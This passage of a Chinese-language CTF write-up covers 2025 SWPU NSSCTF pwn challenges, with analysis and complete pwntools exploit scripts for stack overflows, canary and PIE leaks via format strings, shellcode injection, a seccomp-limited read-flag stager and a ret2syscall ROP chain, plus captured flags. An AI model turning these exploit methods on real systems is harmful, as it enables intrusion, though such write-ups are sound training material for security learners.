+<p>0xf426588abcee2052	0x0000c8cb2c5e90c2</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1759063377749-6e3cc987-6be0-436d-9f1c-6dad5c97266b.png" srcset="/img/loading.gif" lazyload></p>
+<p>这边打上断点</p>
+<p>直接写代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs plain">from pwn import *<br>context.log_level=&quot;debug&quot;<br>io=remote(&quot;node5.anna.nssctf.cn&quot;,21164)<br><br>io.recvuntil(&quot;GDB-pwndbg maybe useful\n&quot;)<br>payload=p64(0x144678aadc0e4072)+p64(0x84b6e81a4c7eb0e2)+p64(0xf426588abcee2052)+p64(0x0000c8cb2c5e90c2)<br>io.sendline(payload)<br><br>io.interactive()<br></code></pre></td></tr></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1759064756218-46613cdd-e0d5-4cdd-b543-0ba76c25c2d5.png" srcset="/img/loading.gif" lazyload></p>
+<p>得到flag：nssctf{Yo0ur_ggddddb_1s_o00okkk!}</p>
+<h2 id="不是哥们ret2text还阴啊？"><a href="#不是哥们ret2text还阴啊？" class="headerlink" title="不是哥们ret2text还阴啊？"></a>不是哥们ret2text还阴啊？</h2><!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1759056412068-99c6bf7d-a983-4e86-add4-f580c8d1673a.png" srcset="/img/loading.gif" lazyload></p>
+<p>保护：</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1759056468191-f8fe766a-957a-48ac-a9bd-d8b92b13d561.png" srcset="/img/loading.gif" lazyload></p>
+<p>这个保护怕是确实有点阴</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1759056522106-cf946e32-5e52-4522-8d79-f443603914a1.png" srcset="/img/loading.gif" lazyload></p>
+<p>开了影子栈和间接分支跟踪</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1776393671171-1a808125-7a16-4ff9-adb7-e820b1cbfd19.png" srcset="/img/loading.gif" lazyload></p>
+<p>简而言之就是v2每次循环读一个进v1[i]</p>
+<p>result &#x3D; v1[i]</p>
+<p>如果是\n就跳出循环，然后++i</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1776393866018-bd3774fe-3a80-4266-b82c-1c5a36421d1f.png" srcset="/img/loading.gif" lazyload></p>
+<p>而后门也很明确。就在path1</p>
+<p>那直接构建栈溢出返回path1就好了啊，这题唯一的难点就在于不能直接跳转</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1776393996200-e7242ede-8e66-4d32-90de-d5e61dba00ff.png" srcset="/img/loading.gif" lazyload></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plain">int result; // eax<br>char v1[56]; // [rsp+0h] [rbp-40h] BYREF<br>int v2; // [rsp+38h] [rbp-8h]<br>int i; // [rsp+3Ch] [rbp-4h]<br></code></pre></td></tr></table></figure>
+
+<p>可以看到v1到栈底是0x40的距离，而i是0x4的距离</p>
+<p>所以不难理解我们一味塞东西会把i一起干掉</p>
+<p>我们是要塞0x48个的，也就是说i得是0x47（i从0开始数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs plain">from pwn import *<br>context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;, log_level=&#x27;debug&#x27;)<br><br>io = remote(&#x27;node6.anna.nssctf.cn&#x27;, 26665)<br>backdoor = 0x4011F1<br><br>payload = b&#x27;a&#x27;*(0x40-0x4) + b&#x27;\x47&#x27;  + p64(backdoor)<br>io.sendline(payload)<br>io.interactive()<br></code></pre></td></tr></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1776394823152-386a82a2-8ed4-4b0b-a758-61d52678d6dc.png" srcset="/img/loading.gif" lazyload></p>
+<p>得到flag</p>
+<h2 id="find-flag"><a href="#find-flag" class="headerlink" title="find_flag"></a>find_flag</h2><!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1758979352193-19903487-1816-4f0f-9bb9-e40288c00185.png" srcset="/img/loading.gif" lazyload></p>
+<p>保护：</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1758979427242-c2f2a289-caaf-4345-a283-9f11701f96b5.png" srcset="/img/loading.gif" lazyload></p>
+<p>64位，这特么啥？？全开了？？</p>
+<p>先ida看看吧</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1758979636813-8f43725f-fa83-4104-b34c-ada79539f8b2.png" srcset="/img/loading.gif" lazyload></p>
+<p>直接shift+f12，别的不知道，这个函数有点意思，只要运行这个函数就什么都有了</p>
+<p>sub_1229</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1758979732307-68862fd1-d6b6-472a-a1f1-54e924992ec3.png" srcset="/img/loading.gif" lazyload></p>
+<p>由于保护全开，所以我们必须一个个绕过，首先是还原金丝雀Canary（说起来上边画的是不是就是金丝雀啊。）</p>
+<p>（有点太难了，后边再看吧）</p>
+<p>好我回来了</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1776394877451-ddb058e1-adc5-4365-988c-34d1531e3db7.png" srcset="/img/loading.gif" lazyload></p>
+<p>这边是主要的部分，噢现在看懂了，有格式化字符串漏洞的一道题，保护开了不少，但是通过格式化字符串可以把pie_base和canary的值全部泄露，然后就可以全部bypass了</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1776394993487-49cfb687-b6cd-46dc-ac95-3cf45519be52.png" srcset="/img/loading.gif" lazyload></p>
+<p>还有明显的栈溢出和后门函数，也就是说我们只需要直接用第一个gets函数的格式化字符串得到PIE_base和canary，之后直接构造payload，利用第二个栈溢出返回到后门函数即可</p>
+<p>先探测参数位置</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">AAAA.%p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p<br></code></pre></td></tr></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1776395388940-469054f3-ad6c-4ab9-a475-6a151c667f6a.png" srcset="/img/loading.gif" lazyload></p>
+<p>我们知道canary一般最后是00结尾防止栈溢出的，所以是第17位这一个</p>
+<p>而pie基址可以通过返回地址得到，返回地址在rbp+8，也就是canary上方16字节处，所以是第19位这一个，看起来也符合数字范围</p>
+<p>当然了，直接算也可以的</p>
+<p>format到rbp有0x60，canary又&#x3D;rbp-0x8，所以canary_offset&#x3D;(0x60-0x8)&#x2F;8+6&#x3D;17</p>
+<p>其实都是一样的</p>
+<p>好接下来编写exp，在写的时候绕过canary，跳转地址的时候加piebase就好了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plain">char format[32]; // [rsp+0h] [rbp-60h] BYREF<br>char v2[56]; // [rsp+20h] [rbp-40h] BYREF<br>unsigned __int64 v3; // [rsp+58h] [rbp-8h]<br></code></pre></td></tr></table></figure>
+
+<p>栈溢出的时候先写0x40-8的，然后填充canary，再溢出，再回到backdoor函数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs plain">from pwn import *<br>context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;, log_level=&#x27;debug&#x27;)<br>io = remote(&#x27;node4.anna.nssctf.cn&#x27;, 26912)<br>backdoor = 0x1229<br><br><br>io.sendlineafter(&#x27;name?&#x27;, &#x27;%17$p---%19$p&#x27;)<br>data=io.recvuntil(&quot;!&quot;).decode()<br>tmp=data.split(&quot; &quot;)[5].split(&quot;---&quot;)[0]<br>canary=int(tmp,16)<br>tmp=data.split(&quot;---&quot;)[1].split(&quot;!&quot;)[0]<br>pie_int=int(tmp,16)   <br><br>pie_base = pie_int - 0x0146F<br>backdoor = backdoor + pie_base<br><br>payload = b&#x27;a&#x27;*(0x40-8)+p64(canary)+b&#x27;a&#x27;*8+p64(backdoor)<br>io.sendlineafter(&#x27;Anything else? &#x27;, payload)<br>io.interactive()<br></code></pre></td></tr></table></figure>
+
+<p>得到flag</p>
+<h2 id="fmtstrre"><a href="#fmtstrre" class="headerlink" title="fmtstrre"></a>fmtstrre</h2><!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1776393537159-54d0a24d-7451-4bda-8110-fdf8fae79901.png" srcset="/img/loading.gif" lazyload></p>
+<p>又是一道格式化字符串的题目，而且还有hint</p>
+<p>保护：</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1776402394657-552ee6fd-91a0-4402-b4c2-5576991ce742.png" srcset="/img/loading.gif" lazyload></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1776402421957-7873a0d2-5478-4679-a8f6-031b954e68cc.png" srcset="/img/loading.gif" lazyload></p>
+<p>打开IDA可以看到上来就读了flag放在了fd里边，之后还有一个格式化字符串漏洞，我们可以直接输出</p>
+<p>这边可以看到是把flag放到了name里边</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1776402507550-56898a85-c22b-444d-9da9-dbc8adb46fac.png" srcset="/img/loading.gif" lazyload></p>
+<p>直接就可以看到name在.bss段</p>
+<p>我们先利用格式化字符串然后看看这个0x4040C0在第几个</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">AAAA.%p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p<br></code></pre></td></tr></table></figure>
+
+<p>但是这样子数太累了，一个是写脚本，另一个就是看结构计算位置</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plain">char buf[256]; // [rsp+0h] [rbp-110h] BYREF<br>void *v5; // [rsp+100h] [rbp-10h]<br>int fd; // [rsp+10Ch] [rbp-4h]<br></code></pre></td></tr></table></figure>
+
+<p>buf到rbp是0x110，而v5到那是0x10，正好中间差了0x100</p>
+<p>0x100&#x2F;8+6 &#x3D;38，所以是第38个参数</p>
+<p>%38$s</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1776403092232-5890862d-3380-4f1e-b6ed-ef5b114983b0.png" srcset="/img/loading.gif" lazyload></p>
+<p>即得</p>
+<p>nssctf{Never_giv3_up!!Chall3nge_y0urs31f!!}</p>
+<p>（我当时是懒得了解吗，这种简单题都没做）</p>
+<h2 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode?"></a>shellcode?</h2><!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1776403298078-ba061a91-de32-4ad7-85ca-da1fac8bd73b.png" srcset="/img/loading.gif" lazyload></p>
+<p>保护：</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1776403890803-e8f820be-b0dc-4ea1-84f0-cca44ee8f246.png" srcset="/img/loading.gif" lazyload></p>
+<p>说是shellcode结果NX开了，应该是有法子让我们在栈上执行代码</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1776404090678-1889f7f6-15fe-4ed0-b9f0-1b87ae99700b.png" srcset="/img/loading.gif" lazyload></p>
+<p>可以看到这边mmap映射了一段可写可读可执行的内存</p>
+<p>在0x30303000，而且很大啊，后边我们还能read写进去</p>
+<p>甚至最后直接把我们写的这个内存地址当作了函数调用</p>
+<p>那我们直接去那边shellcode就好了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs plain">from pwn import *<br>context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;, log_level=&#x27;debug&#x27;)<br>io = remote(&#x27;node5.anna.nssctf.cn&#x27;, 23391)<br><br>shellcode = asm(shellcraft.sh())<br>io.sendline(shellcode)<br>io.interactive()<br></code></pre></td></tr></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1776404283710-f1e4d3fd-d4a0-4281-b9eb-02f7160094ac.png" srcset="/img/loading.gif" lazyload></p>
+<p>就那么简单</p>
+<h2 id="babyfmt"><a href="#babyfmt" class="headerlink" title="babyfmt"></a>babyfmt</h2><!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1776403341262-8933736a-bdce-4ab2-9d6b-0988983911d5.png" srcset="/img/loading.gif" lazyload></p>
+<p>两个babyfmt，不知道哪一个是原来的赛题了</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1776404438392-7994dff0-527f-443e-9c96-32ab511c213d.png" srcset="/img/loading.gif" lazyload></p>
+<p>可能是这一个？</p>
+<p>保护：</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1776404478467-8fc0ccca-def3-4856-b65d-5d365a1b95f6.png" srcset="/img/loading.gif" lazyload></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1776404640672-6d7a4825-7ff4-405f-b40b-c24a44f394b1.png" srcset="/img/loading.gif" lazyload></p>
+<p>在输入name这边存在格式化字符串漏洞，我们直接修改nptr，使其等于一个固定值就好了（一开始不是随机数嘛</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1776404701828-4c7df1ec-ef78-4233-9287-be798da45d22.png" srcset="/img/loading.gif" lazyload></p>
+<p>接下来就是确定是第几个参数了</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1776405336196-2692dd0d-d503-4661-9498-c95e3d78897f.png" srcset="/img/loading.gif" lazyload></p>
+<p>第十个，在这边利用格式化字符串修改0x804C044的内容即可</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs plain">from pwn import *<br>context(os=&#x27;linux&#x27;, arch=&#x27;i386&#x27;, log_level=&#x27;debug&#x27;)<br>io = remote(&#x27;node5.anna.nssctf.cn&#x27;, 23174)<br><br>payload = fmtstr_payload(10, &#123;0x804C044: 1&#125;)<br><br>io.sendlineafter(b&#x27;your name:&#x27;,payload)<br>io.send(b&#x27;1&#x27;)<br><br>io.interactive()<br></code></pre></td></tr></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1776405427000-0616e09c-31fc-498f-8251-cfd56a4b68f0.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="simple-shellcode"><a href="#simple-shellcode" class="headerlink" title="simple_shellcode"></a>simple_shellcode</h2><!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1776403356777-c405dbd7-1ebe-445f-a0c6-aa6f217208f6.png" srcset="/img/loading.gif" lazyload></p>
+<p>保护：</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1776405643096-954de61d-e16c-418a-a087-f8f883c9c561.png" srcset="/img/loading.gif" lazyload></p>
+<p>你们shellcode都这样吗</p>
+<p>有的时候我在想在新生赛看见这样子的多保护题是不是应该开心，毕竟新生赛的题开那么多保护反而很简单</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1776405701574-6703815a-3faa-462c-9e7b-580456b528fa.png" srcset="/img/loading.gif" lazyload></p>
+<p>跟上边那个shellcode有点像，这边也是会执行我们输入的，但是这边多了一个sandbox，而且只允许我们输入0x10的大小</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1776406183992-79da602b-20fa-473e-bbfa-3ac235e8a3d3.png" srcset="/img/loading.gif" lazyload></p>
+<p>禁用了execve和execveat的系统调用，但是是允许别的系统调用的，允许ORW</p>
+<p>我们可以直接用syscall进行read的系统调用读取文件，就是shellcode需要我们自己构造了，不太好shellcraft直接出，因为长度限制的很小</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plain">mov rdi, rax    # 1. 准备 read 的参数<br>mov rsi, rdx    # 2. 设置缓冲区地址<br>add rsi, 0x10   # 3. 调整地址偏移<br>syscall         # 4. 执行 read 系统调用<br>call rsi        # 5. 跳转到新代码<br></code></pre></td></tr></table></figure>
+
+<p>其实就是一个read(0, 0xcafe0010, 0x1000) （因为rdx这个时候是0xcafe0010</p>
+<p>主要是为了扩大长度</p>
+<p>之后直接用shellcraft写shellcode读取flag就好啦，符合题目的说法</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs plain">from pwn import *<br>context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;, log_level=&#x27;debug&#x27;)<br>io = remote(&#x27;node5.anna.nssctf.cn&#x27;, 21426)<br><br>shellcode = asm(&#x27;&#x27;&#x27;<br>mov rdi, rax;<br>mov rsi, rdx;<br>add rsi, 0x10;<br>syscall;<br>call rsi;<br>&#x27;&#x27;&#x27;)<br><br>io.sendlineafter(b&#x27;shellcode:\n&#x27;, shellcode)<br><br>payload = asm(shellcraft.cat(&#x27;/flag&#x27;))<br>io.sendline(payload)<br><br>io.interactive()<br></code></pre></td></tr></table></figure>
+
+
+
+<h2 id="烧烤摊儿"><a href="#烧烤摊儿" class="headerlink" title="烧烤摊儿"></a>烧烤摊儿</h2><!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1776403366887-96ccc032-4b9c-43a4-9d8a-672b9c0f76df.png" srcset="/img/loading.gif" lazyload></p>
+<p>霍还是ciscn的初赛题</p>
+<p>保护：</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1776413542364-f39759b9-b54e-4be1-a6e3-ca729ba673b0.png" srcset="/img/loading.gif" lazyload></p>
+<p>注意一下这题是静态的，可能是跟ret2syscall有点关系</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1776413565022-afa12216-5608-4598-9ef6-965cdff8aa48.png" srcset="/img/loading.gif" lazyload></p>
+<p>就是不一样，还有一堆啤酒串</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1776414011027-859e6246-c406-4972-b460-029f2546de97.png" srcset="/img/loading.gif" lazyload></p>
+<p>可以先看看菜单</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1776413670126-5a76dcf5-20a1-4c2a-9134-cc3fcc4e0bf1.png" srcset="/img/loading.gif" lazyload></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1776413701987-dc997a87-70f2-42b2-b12b-ced005b02677.png" srcset="/img/loading.gif" lazyload></p>
+<p>大概是啤酒10块，串5块，但是这边v9是int，我们可以v9&lt;0，然后就有一大堆钱了</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1776414230132-2ea32103-4297-4a8e-ab23-018ca8a8412a.png" srcset="/img/loading.gif" lazyload></p>
+<p>赚钱小妙招</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1776413710947-50b5d906-1d5b-41d8-a5e8-a990e9298b3b.png" srcset="/img/loading.gif" lazyload></p>
+<p>然后可以check一下有多少钱</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1776414058486-a0c394f2-a2ad-4416-98a6-770c1887dfc2.png" srcset="/img/loading.gif" lazyload></p>
+<p>一开始是233</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1776413722537-b19bb16f-b959-483f-9d95-40aef4b1ec41.png" srcset="/img/loading.gif" lazyload></p>
+<p>如果有10w+的钱还能买一个vip，承包了，由于前边能刷钱了，钱不是问题</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1776414272150-cf262187-3cce-4470-997e-09ae3cef369b.png" srcset="/img/loading.gif" lazyload></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1776413777171-9eb6e4e9-33ec-4a2e-88cc-4dcd958bccfb.png" srcset="/img/loading.gif" lazyload></p>
+<p>如果有vip就能这样子了，多了一个改名</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1776414285236-dcb96049-fe7c-46f1-a769-cc206103c992.png" srcset="/img/loading.gif" lazyload></p>
+<p>这边是吧我们写的输入v5，然后v5会复制到全局变量name里边</p>
+<p>显然这边存在栈溢出，虽然开了canary但是这边没有检查</p>
+<p>而且我们一早就知道是ret2syscall，还有一堆寄存器，很多特征在跟我们说就是打这条线</p>
+<p>64位的经典链子看看能不能套</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs plain">payload += p64(pop_rax)<br>payload += p64(59)<br>payload += p64(pop_rdi)<br>payload += p64(binsh)<br>payload += p64(pop_rsi)<br>payload += p64(0)<br>payload += p64(pop_rdx)<br>payload += p64(0)<br>payload += p64(syscall)<br></code></pre></td></tr></table></figure>
+
+<p>找这些东西填入即可</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plain">ROPgadget --binary ./shaokao --only &quot;pop|ret&quot;|grep rax<br>ROPgadget --binary ./shaokao --only &quot;pop|ret&quot;|grep rdi<br>ROPgadget --binary ./shaokao --only &quot;pop|ret&quot;|grep rsi<br>ROPgadget --binary ./shaokao --only &quot;pop|ret&quot;|grep rdx<br></code></pre></td></tr></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1776414907206-00532225-1ef0-41b4-9a4c-ee466f1e2a63.png" srcset="/img/loading.gif" lazyload></p>
+<p>这边带到rbx了，我们在原来的模板payload的基础上要多写一个0</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1776415163378-3a7a6f69-d223-471b-8cb9-8c8910a24b85.png" srcset="/img/loading.gif" lazyload></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plain">pop_rax = 0x458827<br>pop_rdi = 0x40264f<br>pop_rsi = 0x40a67e<br>pop_rdx = 0x4a404b<br>syscall  = 0x402404<br></code></pre></td></tr></table></figure>
+
+<p>最后一个&#x2F;bin&#x2F;sh我们就直接自己写进去，然后会被传到name的全局函数的</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/2025-SWPU-NSSCTF(Pwn%E5%85%A8)/1776415223882-b393868c-2ccf-4536-8ade-cb5186e90ecb.png" srcset="/img/loading.gif" lazyload></p>
+<p>name &#x3D; 0x4e60f0</p>
+<p>构造exp即可</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs plain">from pwn import *<br><br>context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;, log_level=&#x27;debug&#x27;)<br>io = remote(&#x27;node4.anna.nssctf.cn&#x27;, 23743)<br><br>pop_rax = 0x458827<br>pop_rdi = 0x40264f<br>pop_rsi = 0x40a67e<br>pop_rdx = 0x4a404b<br>syscall  = 0x402404<br>name = 0x4e60f0<br><br>io.sendline(b&#x27;2&#x27;)<br>io.sendline(b&#x27;2&#x27;)<br>io.sendline(b&#x27;-100000&#x27;)<br>io.sendline(b&#x27;4&#x27;)<br>io.sendline(b&#x27;5&#x27;)<br><br>payload = b&#x27;/bin/sh\x00&#x27;<br>payload +=  b&#x27;a&#x27;*0x20<br>payload += p64(pop_rax)<br>payload += p64(59)<br>payload += p64(pop_rdi)<br>payload += p64(name)<br>payload += p64(pop_rsi)<br>payload += p64(0)<br>payload += p64(pop_rdx)<br>payload += p64(0)<br>payload += p64(0)<br>payload += p64(syscall)<br><br>io.sendlineafter(&quot;请赐名：\n&quot;, payload)<br>io.interactive()<br><br></code></pre></td></tr></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
